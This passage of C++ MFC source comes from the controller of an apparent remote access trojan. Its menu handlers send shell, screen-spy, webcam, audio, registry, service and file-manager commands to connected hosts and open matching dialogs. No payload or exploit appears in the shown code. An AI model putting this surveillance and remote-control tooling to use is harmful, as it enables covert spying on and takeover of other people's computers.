	Dlg->Create(IDD_DIALOG_TALK, GetDesktopWindow());
	Dlg->ShowWindow(SW_SHOW);
	ContextObject->v1 = TALK_DLG;
	ContextObject->hDlg = Dlg;
	return 0;
}


void CRemoteDlg::OnOnlineDelete()
{
	// TODO: 在此添加命令处理程序代码

	BYTE bToken = COMMAND_BYE;   //向被控端发送一个COMMAND_SYSTEM
	SendSeletedCommand(&bToken, sizeof(BYTE));   //Context     PreSending   PostSending

	CString  strIP;
	int iCount = m_CList_Online.GetSelectedCount();
	int i = 0;


	for (i = 0; i < iCount; i++)
	{
		POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
		int iItem = m_CList_Online.GetNextSelectedItem(Pos);
		strIP = m_CList_Online.GetItemText(iItem, ONLINELIST_IP);
		m_CList_Online.DeleteItem(iItem);
		strIP += "断开连接";
		ShowMessage(true, strIP);
	}
}


void CRemoteDlg::OnOnlineCmd()
{
	BYTE	bToken = COMMAND_SHELL;
	SendSeletedCommand(&bToken, sizeof(BYTE));
}


afx_msg LRESULT CRemoteDlg::OnOpenshelldialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;

	//转到CFileManagerDlg  构造函数
	CShellDlg* Dlg = new CShellDlg(this, m_IocpServer, ContextObject);
	// 设置父窗口为卓面
	Dlg->Create(IDD_DIALOG_SHELL, GetDesktopWindow());    //创建非阻塞的Dlg
	Dlg->ShowWindow(SW_SHOW);

	ContextObject->v1 = SHELL_DLG;
	ContextObject->hDlg = Dlg;

	return 0;
}


void CRemoteDlg::OnOnlineWindowManager()
{
	// TODO: 在此添加命令处理程序代码
	BYTE bToken = COMMAND_WSLIST;
	SendSeletedCommand(&bToken, sizeof(BYTE));
}

//桌面管理
void CRemoteDlg::OnOnlineDesktopManager()
{
	// TODO: 在此添加命令处理程序代码
	BYTE bToken = COMMAND_SCREEN_SPY;
	SendSeletedCommand(&bToken, sizeof(BYTE));
}

//文件管理
void CRemoteDlg::OnOnlineFileManager()
{
	// TODO: 在此添加命令处理程序代码
	BYTE bToken = COMMAND_LIST_DRIVE;//磁盘卷驱动设备
	SendSeletedCommand(&bToken, sizeof(BYTE));
}


afx_msg LRESULT CRemoteDlg::OnOpenFileManagerDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;

	//转到CFileManagerDlg  构造函数
	CFileManagerDlg	*Dlg = new CFileManagerDlg(this, m_IocpServer, ContextObject);
	// 设置父窗口为卓面
	Dlg->Create(IDD_DIALOG_FILE_MANAGER, GetDesktopWindow());    //创建非阻塞的Dlg
	Dlg->ShowWindow(SW_SHOW);

	ContextObject->v1 = FILEMANAGER_DLG;
	ContextObject->hDlg = Dlg;

	return 0;
}




void CRemoteDlg::OnOnlineAudioManager()
{
	// TODO: 在此添加命令处理程序代码
	BYTE bToken = COMMAND_AUDIO;
	SendSeletedCommand(&bToken, sizeof(BYTE));
}


afx_msg LRESULT CRemoteDlg::OnOpenaudiodialog(WPARAM wParam, LPARAM lParam)
{

	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;
	CAudioDlg	*Dlg = new CAudioDlg(this, m_IocpServer, ContextObject);
	// 设置父窗口为卓面
	Dlg->Create(IDD_DIALOG_AUDIO, GetDesktopWindow());    //创建非阻塞的Dlg
	Dlg->ShowWindow(SW_SHOW);

	ContextObject->v1 = AUDIO_DLG;
	ContextObject->hDlg = Dlg;

	return 0;
}


void CRemoteDlg::OnOnlineVideoManager()
{
	// TODO: 在此添加命令处理程序代码
	BYTE	bToken = COMMAND_WEBCAM;                 //向被控端发送命令
	SendSeletedCommand(&bToken, sizeof(BYTE));
}


afx_msg LRESULT CRemoteDlg::OnOpenVideoDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;
	
	CVideoDlg	*Dlg = new CVideoDlg(this, m_IocpServer, ContextObject);
	// 设置父窗口为卓面
	Dlg->Create(IDD_DIALOG_VIDEO, GetDesktopWindow());    //创建非阻塞的Dlg
	Dlg->ShowWindow(SW_SHOW);

	ContextObject->v1 = VIDEO_DLG;
	ContextObject->hDlg = Dlg;

	return 0;
}


void CRemoteDlg::OnOnlineServerManager()
{
	// TODO: 在此添加命令处理程序代码
	BYTE	bToken = COMMAND_SERVICES;         
	SendSeletedCommand(&bToken, sizeof(BYTE));
}


afx_msg LRESULT CRemoteDlg::OnOpenServicesDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;

	
	CServicesDlg	*Dlg = new CServicesDlg(this, m_IocpServer, ContextObject);
	// 设置父窗口为卓面
	Dlg->Create(IDD_DIALOG_SERVICES, GetDesktopWindow());    //创建非阻塞的Dlg
	Dlg->ShowWindow(SW_SHOW);

	ContextObject->v1 = SERVICES_DLG;
	ContextObject->hDlg = Dlg;

	return 0;
}


void CRemoteDlg::OnOnlineRegisterManager()
{
	// TODO: 在此添加命令处理程序代码
	BYTE	bToken = COMMAND_REGEDIT;
	SendSeletedCommand(&bToken, sizeof(BYTE));
}


afx_msg LRESULT CRemoteDlg::OnOpenrRegisterDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;


	CRegisterDlg	*Dlg = new CRegisterDlg(this, m_IocpServer, ContextObject);
	// 设置父窗口为卓面
	Dlg->Create(IDD_DIALOG_REGISTER, GetDesktopWindow());    //创建非阻塞的Dlg
	Dlg->ShowWindow(SW_SHOW);

	ContextObject->v1 = REGISTER_DLG;
	ContextObject->hDlg = Dlg;

	return 0;
}


afx_msg LRESULT CRemoteDlg::OnOpenScreenspyDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;


	CScreenSpyDlg	*Dlg = new CScreenSpyDlg(this, m_IocpServer, ContextObject);   //Send  s
																				   // 设置父窗口为卓面
	Dlg->Create(IDD_DIALOG_SCREEN_SPY, GetDesktopWindow());
	Dlg->ShowWindow(SW_SHOW);


	ContextObject->v1 = SCREENSPY_DLG;
	ContextObject->hDlg = Dlg;
	return 0;
}
